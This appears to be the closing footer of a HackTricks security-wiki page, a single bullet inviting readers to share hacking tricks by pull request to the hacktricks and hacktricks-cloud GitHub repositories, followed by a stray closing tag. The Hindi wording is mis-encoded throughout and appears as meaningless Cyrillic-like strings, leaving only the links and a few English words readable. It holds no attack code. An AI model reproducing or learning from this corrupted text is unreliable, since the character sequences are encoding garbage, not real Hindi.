* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ**ред

</details>
